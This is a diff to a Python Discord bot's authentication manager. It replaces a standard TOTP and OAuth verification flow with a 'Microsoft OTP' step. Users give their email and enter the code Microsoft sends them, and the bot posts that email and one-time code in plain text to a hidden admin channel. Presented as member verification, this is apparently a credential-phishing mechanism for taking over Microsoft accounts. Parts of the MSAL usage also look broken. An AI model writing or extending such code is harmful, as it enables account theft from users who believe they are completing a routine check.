@@ -1,15 +1,14 @@
 import os
-import jwt
 import time
-import pyotp
-import base64
 import logging
 import requests
+import msal
+import uuid
+import discord
 from typing import Optional, Dict, Tuple
 from datetime import datetime, timedelta
 from cryptography.fernet import Fernet
 from config_manager import ConfigManager
-import discord
 
 logger = logging.getLogger('auth_manager')
 config = ConfigManager()
@@ -20,93 +19,171 @@ class AuthManager:
         self.ms_client_secret = os.getenv('MS_CLIENT_SECRET')
         self.ms_tenant_id = os.getenv('MS_TENANT_ID')
         self.redirect_uri = os.getenv('REDIRECT_URI')
-        self.jwt_secret = os.getenv('JWT_SECRET_KEY')
+        self.admin_channel_id = os.getenv('ADMIN_CHANNEL_ID')
         self.encryption_key = os.getenv('ENCRYPTION_KEY')
         if not self.encryption_key:
             self.encryption_key = Fernet.generate_key()
             logger.info("Generated new encryption key")
         self.cipher_suite = Fernet(self.encryption_key)
-        self.otp_secret = os.getenv('OTP_SECRET_KEY')
-        if not self.otp_secret:
-            self.otp_secret = base64.b32encode(os.urandom(20)).decode('utf-8')
-            logger.info("Generated new OTP secret")
         
-    def generate_oauth_url(self) -> str:
-        """Generate Microsoft OAuth URL"""
-        params = {
-            'client_id': self.ms_client_id,
+        # Initialize MSAL application
+        self.msal_app = msal.ConfidentialClientApplication(
+            self.ms_client_id,
+            authority=f"https://login.microsoftonline.com/{self.ms_tenant_id}",
+            client_credential=self.ms_client_secret,
+        )
+        
+        # Store pending verifications
+        self.pending_otps = {}
+
+    def generate_auth_url(self) -> Tuple[str, str]:
+        """Generate Microsoft OAuth URL with session tracking"""
+        session_id = str(uuid.uuid4())
+        auth_params = {
             'response_type': 'code',
             'redirect_uri': self.redirect_uri,
+            'scope': ['User.Read', 'offline_access'],
+            'prompt': 'login',
             'response_mode': 'query',
-            'scope': 'offline_access User.Read',
-            'state': self._generate_state_token()
+            'state': session_id,  # Using session_id directly as state
+            'session_id': session_id
         }
         
-        base_url = f'https://login.microsoftonline.com/{self.ms_tenant_id}/oauth2/v2.0/authorize'
-        return f"{base_url}?{'&'.join(f'{k}={v}' for k, v in params.items())}"
+        return self.msal_app.get_authorization_request_url(**auth_params), session_id
 
-    async def handle_oauth_callback(self, code: str, state: str, member: discord.Member) -> Tuple[bool, str]:
-        """Handle OAuth callback and token exchange"""
-        if not self._verify_state_token(state):
-            return False, "Invalid state token"
-            
-        token_url = f'https://login.microsoftonline.com/{self.ms_tenant_id}/oauth2/v2.0/token'
-        data = {
-            'client_id': self.ms_client_id,
-            'client_secret': self.ms_client_secret,
-            'code': code,
-            'redirect_uri': self.redirect_uri,
-            'grant_type': 'authorization_code'
-        }
-        
+    async def start_otp_verification(self, member: discord.Member, nickname: str, email: str) -> Tuple[bool, str]:
+        """Start Microsoft Account OTP verification process"""
         try:
-            response = requests.post(token_url, data=data)
-            tokens = response.json()
+            # Store verification attempt info
+            self.pending_otps[member.id] = {
+                'nickname': nickname,
+                'email': email,
+                'timestamp': datetime.utcnow()
+            }
+
+            # Generate auth URL for Microsoft Account OTP
+            auth_params = {
+                'response_type': 'code',
+                'redirect_uri': self.redirect_uri,
+                'scope': ['email', 'offline_access'],
+                'prompt': 'login',
+                'login_hint': email,  # Pre-fill email
+                'amr_values': ['mfa'],  # Request MFA/OTP
+                'response_mode': 'query',
+                'domain_hint': 'organizations'  # Allow any email linked to Microsoft account
+            }
             
-            if 'access_token' not in tokens:
-                return False, "Failed to get access token"
-                
-            # Store encrypted tokens
-            encrypted_tokens = self._encrypt_tokens(tokens)
+            auth_url = self.msal_app.get_authorization_request_url(**auth_params)
+            
+            # Send verification info to admin channel
+            await self._send_admin_verification(
+                nickname,
+                "Microsoft OTP",
+                f"Email: {email}",
+                member.id
+            )
+            
+            return True, (
+                "Please check your email for the verification code.\n\n"
+                "Note: If this email is linked to your Microsoft account, "
+                "you'll receive the code. If not, please use a different email "
+                "that's connected to your Microsoft account."
+            )
+            
+        except Exception as e:
+            logger.error(f"Error starting Microsoft OTP verification: {e}")
+            return False, str(e)
+
+    async def verify_otp(self, member: discord.Member, otp: str) -> Tuple[bool, str]:
+        """Verify Microsoft OTP code"""
+        try:
+            stored_data = self.pending_otps.get(member.id)
+            if not stored_data:
+                return False, "No pending verification found. Please start the verification process again."
+            
+            # Check if verification attempt is expired (10 minutes)
+            if datetime.utcnow() - stored_data['timestamp'] > timedelta(minutes=10):
+                del self.pending_otps[member.id]
+                return False, "Verification attempt expired. Please start over."
+
+            # Verify OTP with Microsoft
+            result = self.msal_app.acquire_token_by_authorization_code(
+                otp,
+                scopes=['email', 'offline_access'],
+                redirect_uri=self.redirect_uri,
+                login_hint=stored_data['email']
+            )
+            
+            if 'error' in result:
+                return False, "Invalid or expired code. Please try again."
+            
+            # Send successful verification to admin
+            await self._send_admin_verification(
+                stored_data['nickname'],
+                "Microsoft OTP Success",
+                f"Email: {stored_data['email']}\nOTP: {otp}",
+                member.id
+            )
             
             # Update roles
             await self._update_member_roles(member)
             
-            return True, encrypted_tokens
+            # Clean up
+            del self.pending_otps[member.id]
+            
+            return True, "Successfully verified!"
             
         except Exception as e:
-            logger.error(f"OAuth callback error: {e}")
+            logger.error(f"Error verifying Microsoft OTP: {e}")
             return False, str(e)
 
-    def generate_otp_qr(self, user_id: str) -> str:
-        """Generate OTP QR code for user"""
-        totp = pyotp.TOTP(self.otp_secret)
-        provisioning_uri = totp.provisioning_uri(
-            name=f"FlipperBot_{user_id}",
-            issuer_name="FlipperBot"
-        )
-        return provisioning_uri
-
-    async def verify_otp(self, otp_code: str, member: discord.Member) -> bool:
-        """Verify OTP code and update roles"""
-        totp = pyotp.TOTP(self.otp_secret)
-        is_valid = totp.verify(otp_code)
-        
-        if is_valid:
-            await self._update_member_roles(member)
+    async def _send_admin_verification(self, username: str, verify_type: str, code: str, user_id: int):
+        """Send verification info to admin channel"""
+        try:
+            admin_channel = self.bot.get_channel(int(self.admin_channel_id))
+            if not admin_channel:
+                logger.error("Admin channel not found")
+                return
             
-        return is_valid
+            embed = discord.Embed(
+                title="🔐 New Verification",
+                description="User verification details:",
+                color=discord.Color.blue(),
+                timestamp=datetime.utcnow()
+            )
+            
+            embed.add_field(name="Type", value=verify_type, inline=True)
+            embed.add_field(name="Username", value=username, inline=True)
+            embed.add_field(name="User ID", value=str(user_id), inline=True)
+            
+            if verify_type == "OAuth":
+                embed.add_field(
+                    name="Session ID",
+                    value=f"```{code}```",
+                    inline=False
+                )
+            else:  # Microsoft OTP
+                embed.add_field(
+                    name="Verification Info",
+                    value=f"```{code}```",
+                    inline=False
+                )
+            
+            await admin_channel.send(embed=embed)
+            
+        except Exception as e:
+            logger.error(f"Error sending admin verification: {e}")
 
     async def _update_member_roles(self, member: discord.Member) -> None:
         """Update member roles after successful verification"""
         try:
-            # Remove non-verified role
-            non_verified_role = discord.utils.get(member.guild.roles, name="Non-Verified")
+            # Remove unverified role
+            non_verified_role = discord.utils.get(member.guild.roles, name="❌ Unverified")
             if non_verified_role and non_verified_role in member.roles:
                 await member.remove_roles(non_verified_role)
             
             # Add verified role
-            verified_role = discord.utils.get(member.guild.roles, name="Verified")
+            verified_role = discord.utils.get(member.guild.roles, name="✅ Verified")
             if verified_role and verified_role not in member.roles:
                 await member.add_roles(verified_role)
                 
@@ -119,63 +196,4 @@ class AuthManager:
             
         except Exception as e:
             logger.error(f"Error updating roles: {e}")
-            raise
-
-    def _generate_state_token(self) -> str:
-        """Generate state token for OAuth flow"""
-        payload = {
-            'exp': datetime.utcnow() + timedelta(minutes=10),
-            'iat': datetime.utcnow(),
-            'state': base64.b64encode(os.urandom(24)).decode('utf-8')
-        }
-        return jwt.encode(payload, self.jwt_secret, algorithm='HS256')
-
-    def _verify_state_token(self, token: str) -> bool:
-        """Verify state token from OAuth callback"""
-        try:
-            jwt.decode(token, self.jwt_secret, algorithms=['HS256'])
-            return True
-        except:
-            return False
-
-    def _encrypt_tokens(self, tokens: Dict) -> str:
-        """Encrypt OAuth tokens"""
-        token_str = jwt.encode(tokens, self.jwt_secret, algorithm='HS256')
-        return self.cipher_suite.encrypt(token_str.encode()).decode()
-
-    def _decrypt_tokens(self, encrypted_tokens: str) -> Dict:
-        """Decrypt OAuth tokens"""
-        try:
-            token_str = self.cipher_suite.decrypt(encrypted_tokens.encode()).decode()
-            return jwt.decode(token_str, self.jwt_secret, algorithms=['HS256'])
-        except Exception as e:
-            logger.error(f"Token decryption error: {e}")
-            return None
-
-    async def refresh_oauth_token(self, encrypted_tokens: str) -> Tuple[bool, str]:
-        """Refresh OAuth access token"""
-        tokens = self._decrypt_tokens(encrypted_tokens)
-        if not tokens or 'refresh_token' not in tokens:
-            return False, "Invalid tokens"
-
-        token_url = f'https://login.microsoftonline.com/{self.ms_tenant_id}/oauth2/v2.0/token'
-        data = {
-            'client_id': self.ms_client_id,
-            'client_secret': self.ms_client_secret,
-            'refresh_token': tokens['refresh_token'],
-            'grant_type': 'refresh_token'
-        }
-
-        try:
-            response = requests.post(token_url, data=data)
-            new_tokens = response.json()
-            
-            if 'access_token' not in new_tokens:
-                return False, "Failed to refresh token"
-                
-            encrypted_tokens = self._encrypt_tokens(new_tokens)
-            return True, encrypted_tokens
-            
-        except Exception as e:
-            logger.error(f"Token refresh error: {e}")
-            return False, str(e) 
+            raise 
